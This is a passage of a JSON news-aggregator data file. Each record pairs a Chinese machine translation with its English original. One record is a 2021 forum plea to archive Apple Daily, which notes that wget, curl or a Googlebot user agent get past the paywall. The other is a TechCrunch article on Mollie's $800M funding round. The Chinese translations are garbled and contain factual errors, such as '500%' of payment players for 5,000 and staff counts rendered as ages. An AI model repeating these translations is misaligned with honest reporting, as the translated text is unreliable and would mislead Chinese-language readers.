"\u9999\u6e2f\uff06\uff0339;\u82f9\u679c\u6bcf\u5929\u6700\u8bfb\u53d6\u7684\u4eb2\u6c11\u4e3b\u62a5\u7eb8\uff0c\u5df2\u7ecf\u7a81\u88ad\u4e86\uff0c\u5176\u9ad8\u7ba1\u902e\u6355\u4e86\uff0c\u5176\u8d44\u4ea7\u5728\u8fc7\u53bb\u51e0\u5929\u4e2d\u51bb\u7ed3\u3002\u8fd9\u662f\u9999\u6e2f\u7684\u65b0\u95fb\u81ea\u7531\u7684\u6b7b\u4ea1\u9a91kn\uff0c\u82f9\u679c\u6bcf\u65e5\u82f9\u679c\uff06\uff0339;\u57282019\u5e74\u7684\u53cd\u5f15\u6e21\u6297\u8bae\u6d3b\u52a8\u548c\u5929\u5b89\u95e8\u5927\u5c60\u6740\u5b88\u591c\u7684\u6811\u6728\u662f\u5728\u51e0\u5929\u5185\u6d88\u5931\u7684\u5de8\u5927\u5371\u9669\u3002\u6211\u662f\u4e00\u4e2a\u5f52\u6863\u7684noob\uff0c\u8fd9\u4e2a\u5927\u5c0f\u548c\u622a\u6b62\u65e5\u671f\u7684\u9879\u76ee\u8fdc\u8fdc\u8d85\u51fa\u4e86\u6211\u7684\u624b\u6bb5\u548c\u77e5\u8bc6\u3002\u6211\u9700\u8981\u5e2e\u52a9\u5c06\u5176\u5907\u4efd\u5230Wayback\u673a\u5668\u3002\n   \u4e0d\u5e78\u7684\u662f\uff0c\u6709\u4e00\u4e2aPayWall\u3002\u7b2c\u4e00\u7bc7\u6587\u7ae0\u662f\u514d\u8d39\u7684\uff0c\u4e0b\u4e00\u4e2a\u66f2\u7ebf\u662f\u7528cookie\u5f3a\u5236\u6267\u884c\u7684\u3002\u5728\u6211\u7684\u6d4b\u8bd5\u4e2d\uff0c\u4f3c\u4e4ePayWall\u5e76\u4e0d\u5f71\u54cdWGet\u6216Curl\u7b49\u5de5\u5177\u3002\u5982\u679c\u6240\u6709\u5176\u4ed6\u4eba\u5931\u8d25\uff0c\u60a8\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528GoogleBot\uff06\uff0339; s\u7528\u6237\u4ee3\u7406\uff1a\n   \u5982\u679c\u60a8\u4ecd\u7136\u53d1\u73b0\u81ea\u5df1\u51fb\u4e2d\u4ed8\u8d39\u5899\uff0c\u8bf7\u7ee7\u7eed\u4fdd\u5b58\u3002 PayWall\u662f\u57fa\u4e8eJavaScript\u7684\uff0c\u6240\u6709\u5185\u5bb9\u4ecd\u7136\u5b58\u5728\u3002\n  \u60a8\u53ef\u4ee5\u8fed\u4ee3\u65e5\u671f\u3002\u8bf7\u4f18\u5148\u8003\u86512019\u5e742\u6708\u81f3\u4eca\u3002\n \u6211\u6ca1\u6709\u5b8c\u5168\u786e\u5b9a\u5b83\u662f\u5426\u6db5\u76d6\u4e86\u4e00\u5207\u3002\u6293\u53d6\u7f51\u7ad9\u53ef\u80fd\u4ecd\u7136\u662f\u4e00\u4e2a\u597d\u4e3b\u610f\u3002\n \u8bb8\u591a\u6587\u7ae0\u5305\u542b\u89c6\u9891\uff0c\u4f46YouTube-DL\u4f3c\u4e4e\u5de5\u4f5c\u3002\u6211\uff06\uff0339; m\u8131\u79bb\u4e86\u5982\u4f55\u5f97\u5230\u5b83\u4eec\u7684\u60f3\u6cd5\u3002\n    \u8bf7\u6ce8\u610f\uff0c\u8be5\u9891\u9053\u5305\u542b\u8bb8\u591a\u5c0f\u65f6\u7684Livestreams\u3002\u90a3\u4e9b\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f\u6297\u8bae\u6d3b\u52a8\u524d\u7ebf\u7684\u73b0\u573a\u5f55\u97f3\u3002\u5bf9\u4e0d\u8d77\uff0c\u6211\u4e0d\u77e5\u9053\u6709\u591a\u5c11\u7a7a\u95f4\uff06\uff0339;\u62b1\u6b49\u3002 \n\u975e\u5e38\u611f\u8c22\u4f60\u7684\u5e2e\u52a9\u3002 \u4f60\uff06\uff0339;\u6211\u8981\u628a\u6240\u6709\u7684\u9999\u6e2f\u90fd\u5927\u5174\u3002  P.S.:1\uff06\uff0339;\u5728\u8fc7\u53bb\u4e00\u5468\u7684\u4e00\u76f4\u5728\u6218\u6597\u5f52\u6863\u76d2\uff0c\u65e0\u6d4e\u4e8e\u4e8b\u3002 \u5982\u679c\u4f60\u77e5\u9053\u66f4\u591a\u7684\u53cb\u597d\u53cb\u597d\u7684\u66ff\u4ee3\u54c1\uff0c\u8bf7\u8bc4\u8bba\u8c22\u8c22\u3002 ", "note_en": "Hong Kong&#39;s most-read pro-democracy newspaper, Apple Daily,  has had its office raided, its executives arrested, its assets frozen in the last few days. This is the death knell of press freedom in Hong Kong, and Apple Daily&#39;s trove of reporting on the 2019 Anti-Extradition Protests and Tiananmen massacre vigils is under  imminent danger of disappearing in a few days. I&#39;m a noob at archiving and a project of this size and deadline is well beyond my means and knowledge. I need help backing this up to Wayback Machine.\n   Unfortunately, there is a paywall. The first article is free, the next ones are paywalled, enforced by cookies. In my testing, it seems like the paywall doesn&#39;t affect tools like wget or curl. If all else fails, you could try using googlebot&#39;s user agent:\n   If you still find yourself hitting the paywall, keep saving anyway. The paywall is Javascript-based, all the content is still there.\n  You can just iterate through the dates.  Please prioritize the period of February 2019 to now.\n I&#39;m not exactly sure if that covers everything. It might still be a good idea to crawl the website.\n Many articles contain videos, but youtube-dl doesn&#39;t seem to work. I&#39;m out of ideas on how to get them.\n    Please note that the channel contains many hours-long livestreams. Those are important, as they are live recordings on the frontline of the protests. I have no idea how much space that&#39;s going to take, sorry.\n    Thank you so much for your help. You&#39;ll be doing all Hongkongers a big favour.\n  P.S.: I&#39;ve been fighting ArchiveBox for the past week to no avail. If you know a more noob-friendly alternative, please comment thanks.", "posttime": "2021-06-22 15:45:38", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u901a\u7f09,hong,\u65e5\u671f", "title": "\u5e2e\u52a9\u901a\u7f09\uff1a\u9999\u6e2f\u7684\u4eb2\u6c11\u4e3b\u62a5\u793e\u8feb\u5728\u7709\u776b\u7684\u5371\u9669 ", "title_en": "Help Wanted: Hong Kong's pro-democracy newspaper in imminent danger", "transed": 1, "url": "https://old.reddit.com/r/DataHoarder/duplicates/o4r4jv/help_wanted_hong_kongs_prodemocracy_newspaper_in/", "via": "", "real_tags": ["\u901a\u7f09", "hong", "\u65e5\u671f"]}, {"category": "", "categoryclass": "", "imagename": "b4e5a577090dfe38cddaf6187440174e.jpg", "infoid": 1067378, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4e00\u7b14\u6b3e\u9879\u542f\u52a8\uff0c\u5176\u540e\u7aef\u6700\u521d\u7531\u521b\u59cb\u4eba\u5efa\u9020\u7684\uff0c\u540c\u65f6\u4ecd\u7136\u4e0e\u7236\u6bcd\u4e00\u8d77\u751f\u6d3b\u5e76\u542f\u52a8\u516c\u53f8\uff0c\u4eca\u5929\u5ba3\u5e03\u4e86\u4e00\u4e2a\u5927\u89c4\u6a21\u7684\u8d44\u91d1\uff0c\u8fd9\u4e9b\u8d44\u91d1\u88ab\u5f39\u5c04\u5230\u6b27\u6d32\u6700\u6709\u4ef7\u503c\u7684\u521d\u521b\u516c\u53f8\u4e4b\u4e00\u3002 Mollie\u662f\u4e00\u5bb6\u57fa\u4e8e\u963f\u59c6\u65af\u7279\u4e39\u7684\u542f\u52a8\uff0c\u4e3a\u4f01\u4e1a\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b9\u5f0f\uff0c\u4ee5\u901a\u8fc7API\u5c06\u4ed8\u6b3e\u6574\u5408\u5230\u7f51\u7ad9\uff0c\u6587\u4ef6\u548c\u5176\u4ed6\u670d\u52a1\uff0c\u4eca\u5929\u5ba3\u5e03\u5b83\u5df2\u5728\u4e00\u8f6e\u7684\u5168\u90e8\u80a1\u6743\u4e0a\u63d0\u9ad8\u4e866.65\u4ebf\u6b27\u5143\uff088\u4ebf\u7f8e\u5143\uff09\u516c\u53f8\u4ef7\u503c54\u4ebf\u6b27\u5143\uff0865\u4ebf\u7f8e\u5143\uff09\u3002\n  Mollie\u8fd1\u5e74\u6765\u4e00\u76f4\u5728\u4e00\u4e2a\u4e3b\u8981\u7684\u751f\u957f\u6cea\u6d41\u6ee1\u9762\u3002\u8be5\u516c\u53f8\u76ee\u524d\u6b63\u5728\u8ffd\u8e2a2021\u5e74\u7684\u4ed8\u6b3e\u4e2d\u4ed8\u6b3e\u7684\u7ea620\u4ebf\u6b27\u5143\uff08\u8fd1240\u4ebf\u7f8e\u5143\uff09\uff0c\u524d\u4e00\u5e74\u589e\u52a0100\uff05\uff0c\u6b64\u65f6\u6536\u5230\u7ea6100\u4ebf\u6b27\u5143\u3002\u5b83\u76ee\u524d\u62e5\u6709120,000\u540d\u6bcf\u6708\u6d3b\u8dc3\u5546\u5bb6\uff08\u4e0e2020\u5e74\u768410\u4e07\u4eba\uff09\uff0c\u5ba2\u6237\u5305\u62ec\u9001\u8d27\uff0c\u8054\u5408\u56fd\u513f\u7ae5\u57fa\u91d1\u4f1a\uff0c\u5b8f\u7881\u548c\u731c\u6d4b\u7684\u559c\u6b22\u3002\u5b83\u6bcf\u5929\u90fd\u5728400\u5230500\u4e2a\u65b0\u5ba2\u6237\u4e4b\u95f4\u589e\u52a0\u3002\n  \u8981\u80af\u5b9a\u7684\u662f\uff0c\u5927\u6d41\u884c\u75c5\u5728\u5546\u4e1a\u65b9\u9762\u8fdb\u884c\u4e86\u5927\u89c4\u6a21\u7684\u8f6c\u53d8\uff0c\u914d\u5907\u5404\u79cd\u4ea4\u6613 - \u8d2d\u4e70\u5546\u54c1\uff0c\u652f\u4ed8\u670d\u52a1\uff0c\u5904\u7406\u60a8\u7684\u94f6\u884c\u548c\u5176\u4ed6\u8d22\u52a1 - \u6240\u6709\u4eba\u90fd\u642c\u5165\u6570\u5b57\u4e16\u754c\uff0c\u4e5f\u4e3aMollie\u64ad\u653e\u3002\n \u4f46\u8fd9\u4e5f\u4e0d\u662f\u5168\u6587\uff1a\u4e0a\u5e74\u540c\u6837\u7684\u901f\u5ea6\u4f3c\u4e4e\u4f3c\u4e4e\u8868\u660e\u5373\u4f7f\u6211\u4eec\u5f00\u59cb\u770b\u5230\u66f4\u591a\u7684\u5927\u6d41\u884c\u8ff9\u8c61\uff08\u4e95\uff0c\u81f3\u5c11\u4e3a\u67d0\u4e9b......\uff09\uff0c\u8f6c\u53d8\u4e3a\u652f\u4ed8\u548c\u5728\u7ebf\u8d2d\u4e70\uff08\u5e76\u4f7f\u7528Mollie Rails\u8fd9\u6837\u505a\uff09\u5c06\u7559\u4e0b\u6765\u3002\n \u201c\u60a8\u552f\u4e00\u53ef\u4ee5\u5728\u4ed8\u6b3e\u4e2d\u53ef\u9760\u8861\u91cf\u7684\u662f\u6d88\u8d39\u8005\u82b1\u8d39\u3002\u8fd9\u662f10\uff05\uff0c\u73b0\u5728\u5b83\u662f15-20\uff05\uff0c\u201cShane Happach\u8868\u793a\uff0c\u4eca\u5e744\u6708\u4ece\u521b\u59cb\u4ebaAdriaan Mol\uff08\u5076\u7136\u7684\uff0c\u4e5f\u662f\u7559\u8a00\u9e1f\u7c7b\u7684\u521b\u59cb\u4eba; Mol's Knickname\u7684\u521b\u59cb\u4ebaMollie\uff0c\u56e0\u6b64\u8be5\u516c\u53f8\u7684\u540d\u79f0\uff09\u3002\n \u5728\u91c7\u8bbf\u4e2d\uff0cHappach\u89e3\u91ca\u8bf4\uff0c\u6d88\u8d39\u8005\u82b1\u8d39\u548c\u968f\u540e\u7684\u53ef\u5bfb\u6c42\u6d88\u8d39\u5e02\u573a\uff0c\u662f\u6700\u80fd\u8868\u660e\u50cfMollie\u8fd9\u6837\u7684\u516c\u53f8\u5982\u4f55\u53d1\u5c55\u7684\u516c\u5236\u3002\u56e0\u6b64\uff0c\u867d\u7136Mollie\u57282004\u5e74\u6210\u7acb\u4ee5\u6765\u7684\u76c8\u5229\u8303\u56f4\u5185\uff0c\u4f46\u8be5\u8ba1\u5212\u5c06\u662f\u5c06\u5929\u7136\u6c14\u7eb3\u5165\u589e\u957f\uff0c\u5efa\u7acb\u76f8\u5173\u670d\u52a1\uff0c\u4ee5\u7ee7\u7eed\u6269\u5927\u5176\u4ea7\u54c1\u63d0\u4f9b\uff0c\u540c\u65f6\u4e5f\u7ee7\u7eed\u79fb\u52a8\u8fdb\u5165\u8d85\u51fa\u5176\u6838\u5fc3\u7684\u66f4\u591a\u5730\u533a\uff0c\u6700\u5927\uff0c\u6b27\u6d32\u5e02\u573a\uff0c\u5176\u65b0\u7684\u5927\u578b\u6295\u8d44\u8005\u6ca1\u6709\u5c0f\u90e8\u5206\u3002\n \u8fd9\u5c06\u4f7f\u5b83\u8fdb\u5165\u66f4\u6df1\u5c42\u6b21\u7684\u7ade\u4e89\u4e0e\u6574\u4e2a\u7403\u5458\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cMollie\u8fdc\u79bb\u5e02\u573a\u4e0a\u552f\u4e00\u7684\u6b3e\u9879\u516c\u53f8\uff0c\u4e5f\u4e0d\u662f\u552f\u4e00\u4e00\u4e2a\u5728\u8fd1\u65f6\u770b\u5230\u4e1a\u52a1\u7e41\u8363\u7684\u552f\u4e00\u4e00\u4e2a\u3002\u4f46\u5b83\u6bd4\u4f60\u60f3\u8c61\u7684\u66f4\u5927\uff0c\u66f4\u5206\u6563\u3002 Happach  - \u5728\u52a0\u5165Mollie\u4e4b\u524d\u5728Worldpay\u5ea6\u8fc7\u4e86\u5341\u5e74 - \u6307\u51fa\uff0c\u5728\u63a8\u51fa\u7684\u5341\u5927\u7403\u5458\u4e2d\u670950\uff05\u7684\u5e02\u573a\uff0c\u4f46\u5176\u4ed6500\uff05\u7684\u7403\u5458\u6301\u6709\u3002 \n\u201c\u4f60\u771f\u7684\u5f88\u60ca\u8bb6\uff0c\u50cf\u6761\u7eb9\u4e00\u6837\u7684\u516c\u53f8\u57285,000\u4e2d\u3002\u4ed6\u4eec\u4e0d\u5728\u524d\u5341\u540d\uff0c\u201c\u4ed6\u8bf4\u3002 \uff08JP Morgan\uff0cWorldPay\uff0cFiserv\uff08\u7b2c\u4e00\u6570\u636e\uff09\uff0cPayPal\u662f\u5360\u7b2c\u4e00\u4e2a\u5341\u4e2a\u7684\u4eba\u4e4b\u4e00\u3002\uff09\u3002\u57fa\u672c\u4e0a\u7ed9\u4e86\u516c\u53f8\u6709\u5f88\u591a\u673a\u4f1a\u6765\u589e\u957f\u548c\u5de9\u56fa\uff0c\u800c\u4e14\u8fd8\u5f3a\u8c03\u4e86\u5e02\u573a\u5bf9\u6bcf\u4e2a\u4eba\u7684\u5927\u5927\u5927\u3002\n \u5728\u6211\u4eec\u7684\u8c08\u8bdd\u4e2d\uff0c\u6761\u7eb9\u63d0\u51fa\u4e86\u51e0\u6b21\uff0c\u7279\u522b\u662f\u5728\u8c08\u8bba\u7ade\u4e89\u5a01\u80c1\u65f6 - \u5b83\u7684\u57fa\u672c\u524d\u63d0\u662f\u50cfMollie\u7684\u57fa\u672c\u524d\u63d0\uff0c\u4e00\u76f4\u662f\u7531\u5ba2\u6237\u6574\u5408\u7684\u652f\u4ed8\u5e73\u53f0\uff08\u4efb\u4f55\u975e\u4ed8\u6b3e\u516c\u53f8\u7684\u590d\u6742\uff09\u901a\u8fc7\u7b80\u5355\u7684API\u7684\u4efb\u4f55\u5730\u65b9;\u8c08\u8bba\u4f30\u503c\u65f6\uff08\u6761\u7eb9\u73b0\u5728\u4ef7\u503c950\u4ebf\u7f8e\u5143\uff09;\u5728\u8c08\u8bba\u4ea7\u54c1\u5267\u672c\u65f6\u3002\n \u5728\u6240\u6709\u60c5\u51b5\u4e0b\uff0c\u4e3b\u8981\u7684\u5916\u5356\u4f3c\u4e4e\u662f\u6761\u7eb9\u7684\u6210\u529f\u4e0e\u5e02\u573a\u83ab\u91cc\u66f4\u9886\u5148\u5730\u4f4d\u3002 \u201c\u6211\u4eec\u770b\u5230\u4e86\u5728SMBS\u8d85\u7ea7\u670d\u52a1\u4e1a\u4eba\u53e3\u4e2d\u7684\u5de8\u5927\u673a\u4f1a\uff0c\u201dHappach\u8bf4\u3002 \u201c\u7279\u522b\u662f\u5982\u679c\u60a8\u67e5\u770b\u6211\u4eec\u7684\u6838\u5fc3\u5e02\u573a\uff0c\u6211\u4eec\u5927\u591a\u6570\u5ba2\u6237\u6765\u81ea\u4eca\u5929\uff0c\u4ed6\u4eec\u53ef\u4ee5\u83b7\u5f97\u7684\u91d1\u878d\u670d\u52a1\u975e\u5e38\u7b28\u62d9\u3002\u201d\u4ed6\u8865\u5145\u8bf4\uff0c\u8be5\u516c\u53f8\u5c06\u91cd\u70b9\u5173\u6ce8\u5b83\u8ba4\u4e3a\u5b83\u53ef\u4ee5\u505a\u5f97\u66f4\u597d\uff0c\u5b83\u53ef\u4ee5\u6bd4\u73b0\u6709\u5728\u90a3\u91cc\u66f4\u597d\uff0c\u8fd9\u4e5f\u8865\u5145\u4e86\u5176\u7ecf\u8425\u4e1a\u52a1\uff1a\u5c0f\u4f01\u4e1a\uff0c\u5361\u53d1\u884c\u548c\u516c\u53f8\u5361\u8ba1\u5212\uff0c\u8d39\u7528\u7ba1\u7406\u548c\u5546\u4e1a\u94f6\u884c\u3002 \uff08\u6240\u6709\u9886\u57df\uff0c\u6211\u5e94\u8be5\u6ce8\u610f\uff0c\u6761\u7eb9\u4e5f\u63a8\u51fa\u4e86\u4ea7\u54c1\u3002\uff09\n \u89c2\u5bdf\u5982\u4f55\u4ee5\u53ca\u5982\u679c\u83ab\u91cc\u7684\u65b9\u5f0f\uff0c\u5b83\u4e5f\u4f1a\u6709\u8da3\uff0c\u56e0\u4e3a\u5b83\u7684\u589e\u957f\uff0c\u66f4\u6709\u4fe1\u5fc3\u53ef\u80fd\u6539\u53d8\u5b83\u7684\u5207\u5272\u3002\u5b83\u62cd\u6444\u4e86PayPal\u5e74\uff0c\u4f46\u5b83\u6700\u8fd1\u91cd\u65b0\u5e73\u8861\u4e86\u5b83\u7684\u5229\u7387\u3002 Happach Notes Mollie\u4ece\u672a\u6709\u8fc7\uff0c\u6ca1\u6709\u8ba1\u5212\u9075\u5faa\u5b83\u3002\n \u7136\u800c\uff0c\u83ab\u91cc\u7684\u4e00\u4e2a\u9886\u57df\u4e0d\u592a\u53ef\u80fd\u6295\u5165\u65b0\u8d44\u672c\u662f\u5728\u6536\u8d2d\u4e2d\u3002\n \u201c\u6211\u6765\u81ea\u4e00\u5bb6\u83b7\u5f97\u4e86\u5176\u4ed6\u516c\u53f8\u7684\u516c\u53f8\uff0c\u6211\u8ba4\u4e3a\u6709\u5f88\u591a\u548c\u51cf\u6570\uff0c\u201dHappach\u8bf4\u3002 \u201c\u5bf9\u4e8e\u83ab\u91cc\uff0c\u6211\u4eec\u6b63\u5728\u5efa\u7acb\u4e00\u4e2a\u6709\u673a\u8ba1\u5212...... [\u6536\u8d2d\u662f]\u603b\u662f\u4e00\u4e2a\u673a\u4f1a\uff0c[\u4f46]\u6211\u4f1a\u8bf4\u8fd9\u4e0d\u662f\u6211\u4eec\u4e0e\u6295\u8d44\u8005\u540c\u610f\u7684\u8bba\u70b9\u662f\u6211\u4eec\u60f3\u505a\u7684\u6700\u6709\u53ef\u80fd\u7684\u4e8b\u60c5......\u6211\u60f3\uff0c\u73b0\u5728\uff0c\u6211\u4eec\u4e3b\u8981\u4e13\u6ce8\u4e8e\u62db\u8058\u5927\u578b\u4eba\u624d\uff0c\u771f\u7684\u662f\u6211\u4eec\u7684\u5546\u4e1a\u4ea7\u54c1\u548c\u5de5\u7a0b\u56e2\u961f\u3002\u53ea\u9700\u6295\u8d44\u6211\u4eec\u81ea\u5df1\u7684\u5546\u4e1a\u5efa\u7b51\u5e76\u57f9\u8bad\u6211\u4eec\u81ea\u5df1\u7684\u4eba\u5458\u5e76\u4e3a\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u6700\u4f73\u65b9\u5f0f\u83b7\u5f97\u7684\u5ba2\u6237\u63d0\u4f9b\u4e86\u5f88\u591a\u4e1c\u897f\u3002\u201c\n \u5b9e\u9645\u4e0a\uff0c\u516c\u53f8\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u771f\u6b63\u901a\u8fc7\u9500\u552e\u961f\u4f0d\u6216\u5927\u8425\u9500\u6295\u8d44\u800c\u662f\u901a\u8fc7\u5634\u5df4\u7684\u8bdd\u8bed\u6765\uff0c\u8fd9\u662f\u9ed1\u77f3\u7684\u4e00\u4e2a\u539f\u56e0\u6765\u6572\u95e8\u3002 \n\u201c\u5728\u9ed1\u77f3\u4e2d\u7559\u4e0b\u4e86\u771f\u6b63\u7559\u4e0b\u6df1\u523b\u5370\u8c61\u7684\u4e8b\u60c5\u4e4b\u4e00\u662f\u6bcf\u5929\u5411Mollie\u6ce8\u518cMollie\u7684\u4eba\uff0c\u5176\u4e2d90-95\uff05\u76f4\u63a5\u4e0eMollie\u7684\u4e92\u52a8\u51e0\u4e4e\u6ca1\u6709\u4e92\u52a8\uff0c\u201dPaul Morrissey\u8bf4\uff0c\u4ed6\u62ac\u5934\u7684Blackstone\u7684\u6295\u8d44 \u6b27\u6d32\u7684\u6d3b\u52a8\u3002 \u201c\u4ed6\u4eec\u53ea\u662f\u627e\u5230\u4e86Mollie\uff0c\u559c\u6b22\u8fd9\u4e2a\u4ea7\u54c1\u5e76\u521a\u521a\u8fdb\u5165\uff0c\u8ffd\u6eaf\u5230\u4e1a\u52a1\u7684\u5355\u4f4d\u7ecf\u6d4e\u5b66......\u5b83\u4e0e\u4ed6\u4eec\u5728\u5e02\u573a\u4e0a\u7684\u7ade\u4e89\u5730\u4f4d\u8c08\u8c08\u3002\u201d  \u8fd9\u662f\u7531\u4e8e\u516c\u53f8\u5f00\u59cb\u5728\u62db\u8058\u63a8\u52a8\u7684\u5174\u4e1a\u65b9\u9762\u7684\u53d8\u5316\u6709\u6240\u6539\u53d8\uff0c\u5728\u672a\u6765\u4e5d\u4e2a\u6708\u5185\u5c06\u5176\u56e2\u961f\u5360480\u5c81\u81f3800\u5c81\u4ee5\u4e0b\u3002 ", "note_en": "A payments startup whose backend was originally built by the founder while still living with his parents and bootstrapping the company is today announcing a massive round of funding that catapults it into being one of the most valuable startups in Europe.  Mollie, an Amsterdam-based startup that provides a way for businesses to integrate payments into sites, documents and other services by way of an API, is today announcing that it has raised \u20ac665 million ($800 million) in an all-equity round that values the company at \u20ac5.4 billion ($6.5 billion).\n  Mollie has been on a major growth tear in recent years. The company is currently on track to process some \u20ac20 billion (nearly $24 billion) in payments in 2021, up 100% on the year before when it processed around \u20ac10 billion. It currently has 120,000 monthly active merchants (versus 100,000 in 2020), and customers include the likes of Deliveroo, Unicef, Acer and Guess. It\u2019s adding between 400 and 500 new customers each day.\n  To be sure, the pandemic saw a massive shift in commerce with all kinds of transactions \u2014 buying goods, paying for services, handling your banking and other finances \u2014 all moving into the digital world, and that also played out for Mollie.\n But that is also not the full story: growing at the same pace this year as last appears to indicate that even as we start to see more signs of the pandemic moving on (well, at least for some\u2026), the shift to paying and buying online (and using Mollie\u2019s rails to do so) will stay.\n \u201cThe only thing you can reliably measure in payments is consumer spend. That was at 10% and now it\u2019s at 15-20%,\u201d said  Shane Happach, who took over as CEO of Mollie in April of this year from founder Adriaan Mol (who, incidentally, was also the founder of MessageBird; Mol\u2019s knickname is Mollie, hence the name of this company).\n In an interview, Happach explained that consumer spend, and the subsequent addressable consumer market, is the metric that best indicates how a company like Mollie will grow. So while Mollie has largely been profitable since being founded back in 2004, the plan now will be to put the gas on growth, building related services around payments to continue expanding its product offering while also continuing to move move into more geographies beyond its core, and biggest, market of Europe, helped in no small part by its new, big investors.\n That will bring it into deeper competition with a whole raft of players. That is to say, Mollie is far from the only payments company on the market, nor is it the only one that has seen business boom in recent times. But it is bigger and much more fragmented than you might think. Happach \u2014 who spent a decade at WorldPay before joining Mollie \u2014 points out that the top ten players in payments have 50% of the market, but the other 50% is held by about 5,000 players.\n \u201cY ou\u2019d be really surprised, companies like Stripe are in the 5,000. They\u2019re not in the top ten,\u201d he said. (JP Morgan, WorldPay, Fiserv (First Data), PayPal are among those that make up the first ten.). That essentially gives the company a lot of opportunity to grow and consolidate, while also underscoring just how big the market is for everyone.\n Stripe came up a few times in our conversation, in particular when talking about competitive threats \u2014 its basic premise, like Mollie\u2019s, has been the building of a payments platform (complex for any non-payment company to do) that can be integrated by customers anywhere by way of a simple API; when talking about valuations (Stripe is  now valued at $95 billion); and when talking about product playbooks.\n In all cases, the main takeaway seems to be that Stripe\u2019s success speaks to the market Mollie has ahead of it. \u201cWe see a huge opportunity in the super underserved population of SMBs,\u201d Happach said. \u201cEspecially if you look at our core markets, where most of our customers come from today, the financial services that they can get access to are very clunky.\u201d The company, he added, will be focusing on a few areas that it believes it can do better than what\u2019s out there now, which also complements its payments business: working capital for small businesses, card issuing and corporate card programs, expense management, and business banking. (All areas, I should note, where Stripe also has launched products.)\n It will also be interesting to watch how and if Mollie, as it grows, gets more confident to potentially change its cut. It\u2019s taken PayPal years, but it has recently rebalanced its rates. Happach notes Mollie never has and  has no plans to follow it.\n One area where Mollie is less likely to invest the new capital is in acquisitions, however.\n \u201cI came from a company that had acquired a load of other companies, and I think there\u2019s pluses and minuses,\u201d Happach said. \u201cFor Mollie, we are building an organic plan\u2026. [Acquisitions are] always an opportunity, [but] I would say it\u2019s not the thesis of what we have agreed with investors is the most likely things that we\u2019d like to do\u2026. I think, right now, we\u2019re mainly focused on hiring as much great talent as we can, really beefing up our commercial product and engineering teams. There\u2019s still quite a lot to do by just investing in our own business building and training our own people and serving the customers that we\u2019ve already got in the best possible way.\u201d\n The company, indeed, hasn\u2019t really grown through a sales force or big marketing investments but largely through word of mouth up to now, one reason Blackstone came knocking.\n \u201cOne of the things that really impressed us at Blackstone is that of the hundreds that sign up to Mollie on a daily basis, 90-95% of them have almost no interaction with Mollie directly,\u201d said Paul Morrissey, who heads up Blackstone\u2019s investing activities in Europe. \u201cThey\u2019re just finding Mollie, loving the product and just getting going and that goes back to kind of the unit economics of the business\u2026 It talks to their competitive position in the market.\u201d\n That is somewhat due to change with the company embarking on a big hiring push, taking its team of 480 to just under 800 in the next nine months.", "posttime": "2021-06-22 15:08:36", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u4ed8\u6b3e,payments", "title": "\u8377\u5170\u4ed8\u6b3e\u542f\u52a8Mollie\u57286.5\u4ebf\u7f8e\u5143\u7684\u4f30\u503c\u4e0b\u7b79\u96c6\u4e86800\u4ebf\u7f8e\u5143 ", "title_en": "\n\t\t\t\tDutch payments startup Mollie raises another $800M at a $6.5B valuation\t\t\t", "transed": 1, "url": "https://techcrunch.com/2021/06/22/dutch-payments-startup-mollie-raises-another-800m-at-a-6-5b-valuation/", "via": "", "real_tags": ["\u4ed8\u6b3e", "payments"]}]